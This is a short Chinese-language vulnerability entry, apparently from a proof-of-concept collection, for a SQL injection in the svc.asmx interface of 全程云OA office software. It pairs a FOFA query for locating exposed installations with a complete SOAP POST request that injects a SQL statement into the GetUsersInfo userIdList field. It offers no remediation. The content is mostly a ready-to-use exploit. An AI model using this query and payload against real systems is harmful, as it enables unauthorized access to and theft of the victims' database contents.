## 全程云OA-svc.asmxSQL注入漏洞

全程云OA svc.asmx 接口存在SQL注入漏洞，攻击者通过SQL注入可以获取服务器数据库敏感信息

## fofa

```
"全程云OA" || "images/yipeoplehover.png"
```

## poc

```
POST /oa/pm/svc.asmx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36
Content-Length: 369
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetUsersInfo"
Accept-Encoding: gzip, deflate, br
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUsersInfo xmlns="http://tempuri.org/">
      <userIdList>select @@version</userIdList>
    </GetUsersInfo>
  </soap:Body>
</soap:Envelope>
```

![image-20240602200806606](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406022008666.png)